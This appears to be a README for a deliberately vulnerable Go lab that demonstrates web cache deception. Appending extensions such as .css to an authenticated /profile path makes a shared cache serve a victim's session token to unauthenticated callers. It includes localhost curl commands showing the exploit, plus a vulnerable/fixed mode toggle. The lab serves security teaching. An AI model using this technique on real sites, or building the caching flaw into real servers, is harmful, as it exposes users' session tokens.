# Web Cache Deception via Static Extension Confusion

This challenge demonstrates the classic web cache deception (WCD) pattern: appending a static-looking extension (`.css`, `.js`, `.png`, ...) to a dynamic, authenticated endpoint's path causes a shared cache to treat the per-user response as a cacheable static asset, then replay it to any unauthenticated caller.

## How to run it

```bash
go run main.go serve
```

## Endpoints

- `GET /profile` — returns the caller's authenticated profile, including a session token
- `GET /profile.css`, `/profile.js`, `/profile.png`, ... — same authenticated handler, reachable under static-looking paths

## Exploiting it

```bash
# victim, authenticated, is lured into requesting a static-looking variant of their own profile
curl -H "Authorization: Bearer victim-secret-token" http://localhost:8080/profile.css

# attacker, unauthenticated, requests the same static-looking path and receives the victim's cached data
curl http://localhost:8080/profile.css
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: any static-looking extension appended to /profile is cached and served to subsequent callers
go run main.go serve --vulnerable=true

# fixed: static-looking extensions on the authenticated path return 404 and are never cached
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
